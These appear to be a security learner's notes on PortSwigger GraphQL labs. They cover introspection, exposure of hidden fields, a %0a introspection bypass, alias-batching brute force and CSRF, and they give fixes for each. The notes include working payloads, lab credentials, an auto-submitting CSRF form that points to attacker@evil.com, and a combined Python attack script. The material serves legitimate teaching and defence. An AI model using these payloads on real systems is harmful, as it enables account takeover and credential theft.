# Day 33 Notes — GraphQL Security

## 1. What We Did Today Overview

- Studied **GraphQL security** vulnerabilities on PortSwigger Web Security Academy
- Used **Burp Suite** (Proxy, HTTP History, Repeater, GraphQL right-click menu, CSRF PoC generator) as the primary tool
- Completed **Lab 1 — Accessing private GraphQL posts** — used Burp's built-in introspection query to map the schema, found `postPassword` field, extracted password `zwjezg1duwvz71z6gc4b8x54z3e9imhg`
- Completed **Lab 2 — Accidental exposure of private GraphQL fields** — queried `password` field directly on the `getUser` query, retrieved `administrator:aypx9fq945nfjftoimfj`
- Completed **Lab 3 — Hidden GraphQL endpoint + introspection bypass** — discovered endpoint at `GET /api/`, confirmed with `{__typename}`, bypassed introspection block using `%0a` after `__schema`, found `deleteOrganizationUser` mutation, deleted carlos (id: 3)
- Completed **Lab 4 — Brute force protection bypass via GraphQL aliases** — sent 100 aliased login mutations in a single request, bypassed per-request rate limiting, cracked `carlos:mobilemail`
- Completed **Lab 5 — CSRF over GraphQL** — confirmed endpoint accepts `x-www-form-urlencoded`, generated CSRF PoC via Burp, delivered via exploit server to change victim's email


---

## 2. The Foundation — Why GraphQL Vulnerabilities Exist

### Part A — Root Cause

The developer adopting GraphQL made a correct architectural decision — giving clients precise control over what data they request reduces over-fetching and simplifies API design. The mistake was treating the schema as the security boundary. In REST, security is enforced at the endpoint level — each URL has its own access control. In GraphQL, there is one endpoint for everything. Every query, every mutation, every field in the entire application flows through a single `POST /graphql`. Security must now be enforced at the **field and resolver level** — inside each individual data fetching function — rather than at the URL level. Most developers secure the endpoint (require authentication) but forget to secure individual fields and operations within the schema.

A second root cause is **introspection** — GraphQL's built-in schema discovery feature. In development, introspection is invaluable — it lets developers explore the API. In production, it is a complete map of every query, mutation, field, and argument in the application handed to anyone who asks. Developers who forget to disable it in production expose not just the documented API surface but also admin operations, debug queries, and sensitive fields that were never meant to be called from the frontend.

A third root cause specific to Lab 4 is a conceptual mismatch between how rate limiting is designed and how GraphQL batching works. Rate limiting counts requests. GraphQL aliases allow multiple operations to be bundled into a single request. A server that blocks after 3 failed login attempts per request has no protection against 100 login attempts sent as 100 aliases in one request — because from the rate limiter's perspective, only one request was made.

### Part B — The Mental Model

Imagine a library with a single front desk. In a normal library (REST), each shelf has its own librarian who checks your library card before letting you access that section. Fiction librarian, reference librarian, restricted archives librarian — each independently verifies your access.

GraphQL is a library that replaced all the individual librarians with one universal desk. You walk up, hand the desk a list of exactly what you want, and a runner fetches it all. The desk checks that you have a library card (authentication). But whether the runner checks your access level before fetching each individual item (field-level authorization) — that depends on how carefully each runner was programmed.

**Lab 1 and 2** are the runner fetching restricted books because nobody told it to check if those books were off-limits. **Lab 3** is finding the desk through a side entrance that wasn't on the map. **Lab 4** is handing the desk a single form that says "fetch 100 restricted things at once" — the desk only stamps one request but 100 fetches happen. **Lab 5** is tricking someone into handing the desk a form they didn't write by exploiting that the desk accepts forms from any source.

### Part C — Three Conditions Required for Exploitation

**Condition 1:** The application uses GraphQL and exposes it at a discoverable endpoint — either at a standard path (`/graphql`, `/api/graphql`) or discoverable via probing with `{__typename}`.

**Condition 2:** At least one of the following is true — introspection is enabled (revealing the full schema), field-level authorization is missing (sensitive fields return data to any authenticated user), rate limiting operates at the request level rather than the operation level (alias batching bypass), or the endpoint accepts non-JSON content types (CSRF).

**Condition 3:** The attacker has either a valid session token (for field exposure, IDOR, and brute force labs) or can deliver a crafted request to a victim's browser (for CSRF lab).

### Part D — What GraphQL Attacks Can and Cannot Do

**GraphQL attacks CAN:**
- Reveal the entire API schema including hidden admin operations via introspection
- Access private data by requesting fields the frontend never asks for
- Perform IDOR by changing ID arguments in queries — same as REST IDOR
- Bypass rate limiting by batching multiple operations as aliases in a single request
- Perform CSRF on mutations if the endpoint accepts `application/x-www-form-urlencoded`
- Discover and call hidden mutations (delete user, change role) via introspection

**GraphQL attacks CANNOT:**
- Bypass authentication if tokens are properly validated at the resolver level
- Access fields that have correct field-level authorization checks even if introspection reveals they exist
- Exploit alias batching if rate limiting counts operations rather than requests
- Perform CSRF if the endpoint strictly requires `application/json` (which browsers cannot send in cross-origin form submissions without CORS preflight)

---

## 3. Lab 1 — Accessing Private GraphQL Posts

### The Setup

The blog application fetches posts via a GraphQL endpoint at `POST /graphql/v1`. Some posts are marked private and never shown in the UI. However, the GraphQL schema includes a `postPassword` field on the post type — and the server returns it for any post to any authenticated user who asks for it.

### The Introspection Query Used

In Burp Repeater, the standard blog query was replaced using Burp's built-in GraphQL menu: **right-click > GraphQL > Set introspection query**. Burp automatically inserted the full introspection query:

```graphql
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
            ...FullType
        }
        directives {
            name
            description
            locations
            args { ...InputValue }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args { ...InputValue }
        type { ...TypeRef }
        isDeprecated
        deprecationReason
    }
    inputFields { ...InputValue }
    interfaces { ...TypeRef }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType { kind name }
        }
    }
}
```

The introspection response revealed the full schema — including a `postPassword` field on the post type that the frontend never requested.

### The Query Used to Extract the Password

```graphql
{
  getPost(id: 3) {
    id
    title
    postPassword
  }
}
```

### The Result

```
postPassword: "zwjezg1duwvz71z6gc4b8x54z3e9imhg"
```

Submitting this password solved the lab.

### Why It Worked — Technical Explanation

The frontend query only requested `id`, `title`, and `body` — fields safe to show publicly. The `postPassword` field existed in the schema but the frontend never asked for it, so developers assumed it was safe to leave in. This assumption is wrong.

In GraphQL, field-level access is not determined by whether the frontend asks for a field — it is determined by whether the server's resolver for that field checks authorization before returning data. The `postPassword` resolver returned the value to any caller without checking if the caller was the post owner or an admin.

The introspection query revealed the field existed. Once known, requesting it was a single line addition to any query. The server happily returned it.

### What This Proves

This confirms that fields in the GraphQL schema that are never used by the frontend are still accessible to anyone who asks for them — if field-level authorization is absent. Introspection converts this from a guessing game into a guaranteed discovery.

---

## 4. Lab 2 — Accidental Exposure of Private GraphQL Fields

### The Setup

The application exposes a `getUser` query. The frontend only requests `id` and `username`. The schema also includes a `password` field on the User type — which returns the actual plaintext (or hashed) password to anyone who requests it.

### The Request Sent

```http
POST /graphql/v1 HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/json

{
  "query": "\n    query getUser($id: Int!) {\n        getUser(id: $id) {\n           id\n            username\n            password\n        }\n    }",
  "operationName": "getUser",
  "variables": {"id": 1}
}
```

The `password` field was added to the existing `getUser` query. The `variables` object passes `id: 1` which maps to the administrator account.

### The Response

```json
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "aypx9fq945nfjftoimfj"
    }
  }
}
```

### Why It Worked — Technical Explanation

The `password` field was included in the User type definition in the schema. This means someone wrote the resolver for it — a function that fetches and returns the password value from the database. There is no check in that resolver verifying the requesting user is an admin or is requesting their own account.

```javascript
// Vulnerable resolver pattern
const UserType = new GraphQLObjectType({
    name: 'User',
    fields: {
        id: { type: GraphQLInt },
        username: { type: GraphQLString },
        password: {
            type: GraphQLString,
            resolve: (user) => user.password  // returns to anyone who asks
            // No authorization check — no "is this the requesting user?" check
        }
    }
});
```

The fact that the frontend never requests `password` provides zero security. The schema exposes it, the resolver returns it, anyone can ask.

### What This Proves

This confirms that sensitive fields left in the GraphQL schema without resolver-level authorization checks are accessible to any authenticated user. The frontend's choice of which fields to request is irrelevant to server-side security.

---

## 5. Lab 3 — Hidden GraphQL Endpoint + Introspection Bypass

### Part A — Finding the Hidden Endpoint

The application did not expose GraphQL at the standard `/graphql` path. Common paths were probed using the universal GraphQL probe query:

```http
GET /api?query=query{__typename} HTTP/1.1
Host: TARGET.web-security-academy.net
```

The response confirmed the endpoint:

```json
{"data": {"__typename": "query"}}
```

Key observation: the endpoint accepted GET requests with the query as a URL parameter — not just POST with a JSON body. This is important for both discovery and for the introspection bypass that follows.

### Part B — Introspection Blocked

Sending the standard introspection query to the discovered endpoint returned an error — introspection had been disabled. The server was checking for the string `__schema` in the request and blocking it.

### Part C — Introspection Bypass via URL Encoding

The server's introspection check looked for the literal string `__schema` but did not account for URL-encoded newline characters. Adding `%0a` (URL-encoded newline) immediately after `__schema` broke the string match while still being parsed as valid GraphQL by the server:

```
GET /api?query=query+IntrospectionQuery+{+__schema%0a{types{name}}} HTTP/1.1
```

The server's string-matching check saw `__schema%0a` — which did not match `__schema` — and allowed the request through. The GraphQL parser decoded the `%0a` as a newline character, which is valid whitespace in GraphQL syntax, and executed the introspection query normally.

The full introspection response revealed the complete schema including a `deleteOrganizationUser` mutation that was never exposed in the frontend UI.

### Part D — Using the Hidden Mutation

The introspection response showed the mutation structure:

```graphql
mutation($input: DeleteOrganizationUserInput) {
  deleteOrganizationUser(input: $input) {
    user {
      id
      username
    }
  }
}
```

With `id: 3` identified as carlos from the schema's user data, this mutation was sent directly in Burp Repeater. The mutation executed successfully and deleted carlos, solving the lab.

### Why It Worked — Technical Explanation

The introspection bypass works because the server implemented its check at the string-matching layer rather than at the GraphQL parsing layer. String matching is inherently brittle — any encoding, whitespace, or formatting variation that preserves GraphQL validity but changes the literal string representation will bypass it.

The correct approach is to disable introspection at the GraphQL engine configuration level, where it operates on the parsed query structure rather than the raw string. A parsed-level check sees `__schema` as a field reference regardless of how whitespace or encoding appears in the original request.

The hidden mutation being callable without authorization is the same pattern as Labs 1 and 2 — a developer added an admin operation to the schema without implementing access control on the resolver. The mutation deleted any user by ID with no ownership or role check.

### What This Proves

This confirms that string-based introspection blocking is bypassable and should not be relied upon. It also confirms that hidden mutations discovered via introspection are often callable without authorization — the assumption that "nobody knows about this endpoint" is not a security control.

---

## 6. Lab 4 — Bypassing Brute Force Protection via GraphQL Aliases

### The Setup

The application has a login mutation protected by rate limiting — it blocks login attempts after 3 failures per session. However, GraphQL aliases allow multiple operations to be named and sent in a single request. The rate limiter counts HTTP requests — not GraphQL operations within a request. Sending 100 aliased login attempts in one HTTP request bypasses the per-request limit entirely.

### Why GraphQL Aliases Enable This

In normal GraphQL, you cannot call the same field twice in one query — it would be a naming conflict:

```graphql
# This is invalid — duplicate field names
mutation {
  login(input: {username: "carlos", password: "abc"}) { token }
  login(input: {username: "carlos", password: "def"}) { token }
}
```

Aliases solve this by giving each operation a unique name:

```graphql
mutation {
  bruteforce0: login(input: {username: "carlos", password: "abc"}) { token success }
  bruteforce1: login(input: {username: "carlos", password: "def"}) { token success }
}
```

Each alias (`bruteforce0`, `bruteforce1`) is a separate login attempt. All execute server-side in a single HTTP request.

### The Batched Mutation Sent (excerpt)

100 aliased login mutations were sent in a single request. Each alias tried a different password from a common wordlist:

```graphql
mutation login {
  bruteforce0: login(input:{password: "123456", username: "carlos"}) {
    token
    success
  }
  bruteforce1: login(input:{password: "password", username: "carlos"}) {
    token
    success
  }
  bruteforce2: login(input:{password: "12345678", username: "carlos"}) {
    token
    success
  }
  -- [continues for 100 aliases] --
  bruteforce93: login(input:{password: "mobilemail", username: "carlos"}) {
    token
    success
  }
  -- [continues to bruteforce99] --
}
```

### The Result

`bruteforce93` returned `"success": true` with a valid token — confirming the correct password:

```
carlos:mobilemail
```

All 100 attempts were processed by the server. The rate limiter never triggered because it counted one HTTP request, not 100 login operations.

### Why It Worked — Technical Explanation

The rate limiter was implemented at the HTTP middleware layer — it incremented a counter per incoming request and blocked when the counter exceeded the threshold. This is the correct approach for REST APIs where one request equals one operation.

In GraphQL, one request can contain N operations via aliasing. The rate limiter's counter incremented by 1 for the batched request containing 100 login attempts. The threshold of 3 was never reached.

A correct fix counts individual GraphQL operation executions, not HTTP requests. The fix can also be implemented at the resolver level — the login resolver increments a per-user attempt counter regardless of how many aliases are in the incoming request.

### What This Proves

This confirms the rate limiter operates at the HTTP request level without awareness of GraphQL operation batching. Any endpoint that allows aliases and has request-level rate limiting is vulnerable to brute force via this technique.

---

## 7. Lab 5 — CSRF over GraphQL

### The Setup

The application's email change functionality is powered by a GraphQL mutation. The endpoint normally accepts `application/json`. However, it also accepts `application/x-www-form-urlencoded` — a content type that browsers can send in cross-origin form submissions without triggering CORS preflight. This makes the mutation vulnerable to CSRF.

### Steps Performed

1. Logged in as `wiener:peter` and submitted an email change via the UI
2. In **Burp HTTP History** found the resulting GraphQL mutation:
   ```http
   POST /graphql/v1 HTTP/1.1
   Content-Type: application/json

   {"query":"mutation changeEmail($input: ChangeEmailInput!) {\n    changeEmail(input: $input) {\n        email\n    }\n}","operationName":"changeEmail","variables":{"input":{"email":"test@test.com"}}}
   ```
3. Sent to **Burp Repeater** — confirmed the email changed again with the same session cookie, proving session cookies are not rotated between mutations
4. Right-clicked the request in Repeater and selected **Change request method** twice — this converted it from `application/json` POST to `application/x-www-form-urlencoded` POST
5. Re-added the mutation body in URL-encoded format:
   ```
   query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
   ```
6. Sent — the server accepted the request and changed the email, confirming `x-www-form-urlencoded` is supported
7. Right-clicked the request and selected **Engagement tools > Generate CSRF PoC** — Burp generated the HTML form
8. Amended the email in the PoC to a third address (required because the previous steps had already used two addresses — the exploit must change from the current value)
9. Copied the generated HTML and pasted it into the exploit server

### The CSRF Payload

```html
<html>
  <body>
    <form action="https://TARGET.web-security-academy.net/graphql/v1" method="POST"
          enctype="application/x-www-form-urlencoded">
      <input type="hidden" name="query"
             value="
    mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
            email
        }
    }">
      <input type="hidden" name="operationName" value="changeEmail">
      <input type="hidden" name="variables"
             value="{&quot;input&quot;:{&quot;email&quot;:&quot;attacker@evil.com&quot;}}">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

The form auto-submits when the victim visits the exploit server page. The victim's session cookie is sent automatically by the browser with the form submission. The server accepts the `x-www-form-urlencoded` content type and processes the mutation — changing the victim's email to the attacker's chosen address.

### Why It Worked — Technical Explanation

CSRF protection for API endpoints typically relies on the browser's CORS preflight mechanism. When JavaScript sends a `POST` request with `Content-Type: application/json` to a different origin, the browser first sends a preflight OPTIONS request. If the server doesn't allow the cross-origin request, the preflight fails and the POST is never sent.

However, HTML forms can submit `application/x-www-form-urlencoded` without triggering a CORS preflight — this is a "simple request" that browsers allow cross-origin by default. If the GraphQL endpoint accepts this content type, any HTML page the victim visits can make the victim's browser submit the form — with the victim's session cookie attached — without the victim's knowledge.

The vulnerability is not in CORS itself but in the server accepting a content type that bypasses the preflight check. The fix is to strictly enforce `Content-Type: application/json` and reject all other content types on the GraphQL endpoint.

### What This Proves

This confirms that GraphQL endpoints are not inherently CSRF-safe. The assumption that "APIs use JSON so CSRF isn't possible" is wrong when the endpoint also accepts form-encoded content. Any GraphQL mutation that changes sensitive data (email, password, payment info) on an endpoint accepting `x-www-form-urlencoded` is vulnerable to CSRF.

---

## 8. What Failed and Why

No failures — all five labs completed without hints.

One conceptual clarification worth documenting: Lab 3's introspection bypass (`%0a` after `__schema`) and Lab 4's alias batching are both examples of the same underlying principle — the developer implemented a security control at the wrong layer. In Lab 3, the check operated on raw string content rather than the parsed GraphQL AST (Abstract Syntax Tree). In Lab 4, the rate limiter operated on HTTP requests rather than GraphQL operation count. Both controls appear to work correctly in normal usage but fail completely under slightly modified inputs. Security controls must operate at the semantic level of what is being protected — not at the syntactic level of how it arrives.

---

## 9. Chain Thinking

### The Chain

```
Introspection enabled (or bypassed via %0a)
        ↓
Full schema revealed — every query, mutation, field, argument
        ↓
Hidden mutation discovered: deleteOrganizationUser
        ↓
Hidden field discovered: password on User type
        ↓
getUser(id:1) with password field → administrator credentials
        ↓
Login as administrator
        ↓
Use admin session + alias batching to brute force other accounts
        ↓
Full account takeover across all users
        ↓
Chain with CSRF: deliver mutation to admin victim's browser
        ↓
Admin email changed → attacker controls password reset → full admin takeover
```

### Severity Upgrade

Each finding alone:
- Introspection enabled: **Medium** (information disclosure — schema revealed)
- Hidden field exposure (password): **Critical** (credential theft — direct account takeover)
- Hidden mutation (deleteOrganizationUser): **High** (privilege abuse — mass account deletion)
- Alias brute force bypass: **High** (authentication bypass on rate-limited endpoints)
- CSRF on mutation: **High** (account takeover via email change)

The chain converts these into a **Critical** finding with full platform compromise. Introspection alone is not critical — but introspection that reveals a `password` field that returns plaintext credentials is immediately critical.

### Combined Attack Code Pattern

```python
import requests
import json

TARGET = "https://TARGET.web-security-academy.net"

# Step 1: Run introspection to map schema (bypass with %0a if blocked)
introspection = requests.get(
    f"{TARGET}/api",
    params={"query": "query IntrospectionQuery {__schema\n{types{name fields{name}}}}"}
)
schema = introspection.json()

# Find all field names on User type
user_fields = []
for t in schema["data"]["__schema"]["types"]:
    if t["name"] == "User" and t.get("fields"):
        user_fields = [f["name"] for f in t["fields"]]
print(f"User fields discovered: {user_fields}")
# Outputs: ['id', 'username', 'password', 'email', ...]

# Step 2: Extract admin credentials via hidden password field
cred_query = {
    "query": "query getUser($id: Int!) { getUser(id: $id) { id username password } }",
    "operationName": "getUser",
    "variables": {"id": 1}
}
# Requires valid session token
creds = requests.post(
    f"{TARGET}/graphql/v1",
    json=cred_query,
    headers={"Cookie": "session=YOUR_SESSION"}
).json()
admin_password = creds["data"]["getUser"]["password"]
print(f"Admin credentials: administrator:{admin_password}")

# Step 3: Alias batching brute force
passwords = ["123456", "password", "12345678", "mobilemail", "qwerty"]
aliases = "\n".join([
    f'bruteforce{i}: login(input:{{password: "{p}", username: "carlos"}}) {{ token success }}'
    for i, p in enumerate(passwords)
])
batch_mutation = {"query": f"mutation login {{\n{aliases}\n}}"}

result = requests.post(
    f"{TARGET}/graphql/v1",
    json=batch_mutation,
    headers={"Cookie": "session=YOUR_SESSION"}
).json()

for key, val in result["data"].items():
    if val.get("success"):
        print(f"Password found via alias: {passwords[int(key.replace('bruteforce',''))]}")
        print(f"Token: {val['token']}")
```

---

## 10. Real World Context

In 2021, a researcher disclosed that the **GitLab** GraphQL endpoint had introspection enabled in production and exposed internal field names and mutation structures that were not part of the public API documentation. While not directly exploitable on its own, the exposure significantly reduced the effort required to find authorization bypass vulnerabilities.

In 2022, researchers found that several major e-commerce platforms built on Shopify's GraphQL Storefront API had mass assignment-equivalent vulnerabilities — hidden mutations discoverable via introspection that accepted admin-level operations from storefront tokens.

Bug bounty payouts for GraphQL vulnerabilities on HackerOne range widely by impact. Introspection enabled alone typically pays **$200–$500** as an informational/low finding. Hidden field exposure returning credentials is **Critical — $5,000–$30,000**. Hidden mutations enabling account deletion or privilege escalation are **High — $3,000–$15,000**. CSRF on sensitive mutations is **Medium-High — $1,000–$5,000**.

GraphQL vulnerabilities remain common because GraphQL is newer than REST — many security scanning tools and developer security training programs focus on REST patterns. Field-level authorization is a concept that does not exist in REST and requires developers to consciously implement it at every resolver. Most GraphQL security guides focus on introspection and injection — the more subtle field-level and alias-based issues are underrepresented in developer training.

---

## 11. The Fix

### Vulnerable Pattern — Missing Field-Level Authorization

```javascript
// VULNERABLE — password resolver returns to anyone
const UserType = new GraphQLObjectType({
    name: 'User',
    fields: {
        id: { type: GraphQLInt },
        username: { type: GraphQLString },
        password: {
            type: GraphQLString,
            resolve: (user) => user.password  // no auth check
        }
    }
});
```

### Fixed Code — Field-Level Authorization

```javascript
// SAFE — password field checks requesting user's identity
const UserType = new GraphQLObjectType({
    name: 'User',
    fields: {
        id: { type: GraphQLInt },
        username: { type: GraphQLString },
        password: {
            type: GraphQLString,
            resolve: (user, args, context) => {
                // Only return password if the requesting user is an admin
                // or is requesting their own account
                if (!context.user) throw new Error('Not authenticated');
                if (context.user.role !== 'admin' && context.user.id !== user.id) {
                    throw new Error('Not authorized');
                }
                return user.password;
            }
        }
    }
});
```

### Fixed Code — Disable Introspection in Production

```javascript
// Apollo Server — disable introspection in production
const server = new ApolloServer({
    typeDefs,
    resolvers,
    introspection: process.env.NODE_ENV !== 'production',  // false in prod
    // Also disable suggestions — they leak schema info even without introspection
    plugins: [
        {
            requestDidStart() {
                return {
                    willSendResponse({ response }) {
                        // Strip suggestion messages from errors
                        if (response.errors) {
                            response.errors = response.errors.map(err => ({
                                message: 'An error occurred',
                                locations: err.locations,
                                path: err.path
                            }));
                        }
                    }
                };
            }
        }
    ]
});
```

### Fixed Code — Rate Limiting at Operation Level (Alias Batching Fix)

```javascript
// VULNERABLE — rate limiting at HTTP request level
app.use('/graphql', rateLimiter({ max: 3, windowMs: 15 * 60 * 1000 }));

// SAFE — count GraphQL operations, not HTTP requests
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules: [
        depthLimit(5),  // prevents deeply nested queries
        createComplexityLimitRule(1000)  // limits total operation complexity
    ],
    plugins: [{
        requestDidStart() {
            return {
                didResolveOperation({ request, document }) {
                    // Count aliases — reject requests with too many
                    const operationCount = document.definitions.reduce((count, def) => {
                        if (def.kind === 'OperationDefinition') {
                            return count + def.selectionSet.selections.length;
                        }
                        return count;
                    }, 0);

                    if (operationCount > 5) {
                        throw new Error('Too many operations in single request');
                    }
                }
            };
        }
    }]
});
```

### Fixed Code — Prevent CSRF on GraphQL

```javascript
// SAFE — strictly enforce application/json content type
app.use('/graphql', (req, res, next) => {
    const contentType = req.headers['content-type'] || '';

    // Reject anything that isn't JSON — blocks form-urlencoded CSRF
    if (!contentType.includes('application/json')) {
        return res.status(400).json({
            error: 'Invalid Content-Type. Only application/json is accepted.'
        });
    }

    next();
});
```

### Why the Fixes Work

The field-level authorization fix works because security is now enforced at the resolver — the function that actually fetches and returns the data. It does not matter what the client requests or how many layers of API they bypass. The resolver checks the requesting user's identity before returning sensitive data, every time, regardless of how the request arrived.

The introspection fix works because `introspection: false` in Apollo Server operates at the GraphQL engine level — it rejects introspection queries after parsing, before execution. No string-matching bypass is possible because the check happens on the parsed query structure.

The alias batching fix works because it counts the number of selections (individual operations) within a request rather than the number of HTTP requests. An attacker sending 100 aliases hits the 5-operation limit and the request is rejected before any resolver executes.

The CSRF fix works because `application/json` is not a "simple request" — browsers cannot send cross-origin `application/json` form submissions without triggering CORS preflight. By rejecting all other content types, the server ensures only requests that passed CORS validation (or came from same-origin) can reach the GraphQL endpoint.

### What Does NOT Fix It

Disabling introspection alone does not prevent field exposure — if an attacker already knows a field name exists (from documentation, JavaScript source code, or error messages), they can request it without introspection.

Adding CORS headers does not prevent CSRF on form-urlencoded endpoints — CORS restricts cross-origin JavaScript `fetch` requests but not HTML form submissions. Form submissions bypass CORS entirely.

Rate limiting by IP address does not prevent alias batching abuse — all 100 aliased operations come from the same IP in one request. The fix must be at the operation count level.

---

## 12. Key Concepts Summary

| Term | Meaning |
|------|---------|
| **GraphQL** | A query language for APIs where the client specifies exactly what data it wants, all operations go through a single endpoint |
| **Query** | A GraphQL read operation — equivalent to GET in REST |
| **Mutation** | A GraphQL write operation — equivalent to POST/PUT/DELETE in REST |
| **Subscription** | A GraphQL real-time operation — server pushes updates to the client |
| **Schema** | The complete definition of every type, field, query, and mutation available in a GraphQL API |
| **Introspection** | A built-in GraphQL feature that lets clients query the schema itself — reveals the entire API structure |
| **Resolver** | The server-side function that fetches and returns data for a specific field — where authorization must be enforced |
| **Field-Level Authorization** | Checking access rights inside each field's resolver, not just at the endpoint level |
| **Alias** | A GraphQL feature that lets you rename a field in the response — also allows calling the same operation multiple times in one request with different arguments |
| **Alias Batching** | Sending multiple aliased operations in a single HTTP request — exploited to bypass per-request rate limiting |
| **`__schema`** | The introspection entry point — querying this returns the full API schema |
| **`__typename`** | The simplest valid GraphQL query — returns the type name of the root object, used to probe for GraphQL endpoints |
| **`%0a` bypass** | URL-encoded newline character — inserted into `__schema` to bypass string-matching introspection blocks while remaining valid GraphQL |
| **CSRF over GraphQL** | Using an HTML form to submit a GraphQL mutation cross-origin — possible when the endpoint accepts `application/x-www-form-urlencoded` |
| **`x-www-form-urlencoded`** | A content type that HTML forms can send cross-origin without CORS preflight — the enabler of GraphQL CSRF |
| **AST** | Abstract Syntax Tree — the parsed structure of a GraphQL query that security checks should operate on, rather than the raw string |
| **Query complexity** | A metric that counts the computational cost of a GraphQL query — used to prevent abuse via deeply nested or heavily aliased requests |

---

## 13. Payloads and Commands Reference

```graphql
-- Universal probe — confirms GraphQL endpoint exists --
{__typename}
-- Expected response: {"data": {"__typename": "query"}} --
```

```
-- Common GraphQL endpoint paths to probe --
POST /graphql
POST /api/graphql
POST /graphql/v1
GET  /api?query={__typename}
POST /v1/graphql
POST /graphql/api
```

```graphql
-- Partial introspection — find all types --
{
  __schema {
    types {
      name
    }
  }
}

-- Targeted introspection — find all fields on a specific type --
{
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}
```

```
-- Introspection bypass via URL-encoded newline --
GET /api?query=query+IntrospectionQuery+{+__schema%0a{types{name}}}

-- %0a = newline — breaks string match for "__schema" while staying valid GraphQL --
-- Also try: %09 (tab), /**/ (comment), \n in JSON body --
```

```graphql
-- Hidden field extraction (Lab 2) --
query getUser($id: Int!) {
    getUser(id: $id) {
       id
        username
        password
    }
}
-- variables: {"id": 1} --
```

```graphql
-- Hidden mutation execution (Lab 3) --
mutation($input: DeleteOrganizationUserInput) {
  deleteOrganizationUser(input: $input) {
    user {
      id
      username
    }
  }
}
-- variables: {"input": {"id": 3}} --
```

```graphql
-- Alias batching brute force pattern (Lab 4) --
-- Sends N login attempts as N aliases in ONE HTTP request --
mutation login {
  bruteforce0: login(input:{password: "123456", username: "carlos"}) {
    token
    success
  }
  bruteforce1: login(input:{password: "password", username: "carlos"}) {
    token
    success
  }
  -- repeat for every password in wordlist --
  bruteforce93: login(input:{password: "mobilemail", username: "carlos"}) {
    token
    success
  }
}
-- carlos:mobilemail found at bruteforce93 --
```

```
-- CSRF over GraphQL — URL-encoded mutation body (Lab 5) --
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22attacker%40evil.com%22%7D%7D
```

```html
<!-- CSRF PoC — auto-submitting form (Lab 5) -->
<html>
  <body>
    <form action="https://TARGET.web-security-academy.net/graphql/v1"
          method="POST"
          enctype="application/x-www-form-urlencoded">
      <input type="hidden" name="query"
             value="mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) { email }
      }">
      <input type="hidden" name="operationName" value="changeEmail">
      <input type="hidden" name="variables"
             value="{&quot;input&quot;:{&quot;email&quot;:&quot;attacker@evil.com&quot;}}">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

```
-- Burp GraphQL shortcuts --
Right-click request > GraphQL > Set introspection query   (auto-fills full introspection)
Right-click request > Change request method (twice)       (JSON POST → form-urlencoded POST)
Right-click request > Engagement tools > Generate CSRF PoC
```

---

## 14. Foundation Checklist

**Can you explain why GraphQL is more vulnerable to field-level attacks than REST — not what the attacks are, but why the architecture creates the risk?**
REST enforces security at the URL level — each endpoint has its own access control. GraphQL uses one endpoint for everything, so URL-level access control only proves the user is authenticated. Authorization for individual data fields must be implemented inside each resolver. Most developers implement authentication at the endpoint but forget field-level authorization at the resolver, leaving sensitive fields in the schema that return data to any authenticated user who asks.

**Can you perform a full GraphQL reconnaissance flow manually in Burp from zero — no tools, no extensions?**
Yes — probe common paths with `GET /api?query={__typename}` until one returns `{"data":{"__typename":"query"}}`. Then send the full introspection query via Burp's right-click menu or manually. If introspection is blocked, try `__schema%0a` in a GET request. Read the schema for sensitive fields and hidden mutations. Call them directly in Repeater.

**Can you explain the alias batching attack to a developer who has never heard of it, and why their rate limiter doesn't stop it?**
GraphQL aliases let you call the same operation multiple times in one request with different arguments and different response names. Your rate limiter counts HTTP requests — it sees one request and increments the counter once. But inside that one request, 100 login attempts execute. Your rate limiter was designed for REST where one request equals one operation. In GraphQL it is not.

**Can you describe two real-world scenarios where introspection being enabled would directly lead to account takeover?**
First: introspection reveals a `resetPasswordToken` field on the User type. Querying it returns the current password reset token for any user — the attacker requests a password reset for admin@company.com, queries the token, and uses it to set a new password. Second: introspection reveals an `adminCreateUser` mutation that the frontend never exposes. The mutation accepts a `role` argument. The attacker calls it directly to create an admin account.

**Can you chain GraphQL introspection with CSRF and explain the combined attack path?**
Introspection reveals the exact structure of a sensitive mutation — for example, `changeEmail(input: ChangeEmailInput!)` with the required field `email`. Without introspection, building a valid CSRF payload requires guessing the mutation structure. With introspection, the attacker gets the exact field names, argument types, and operation name needed to construct a working `x-www-form-urlencoded` CSRF payload on the first attempt. Introspection removes all the guesswork from the CSRF attack.

**Can you explain why disabling introspection is not sufficient to prevent GraphQL field exposure attacks?**
Disabling introspection prevents the attacker from getting a complete schema map by asking the server. It does not prevent the attacker from discovering fields through other means — JavaScript source files often contain hardcoded query strings with field names, error messages from the server may suggest valid field names (GraphQL suggestion feature), and any field the frontend requests appears in Burp HTTP History. Once a field name is known by any means, it can be requested directly. Field-level authorization in the resolver is the only control that actually prevents unauthorized field access.

---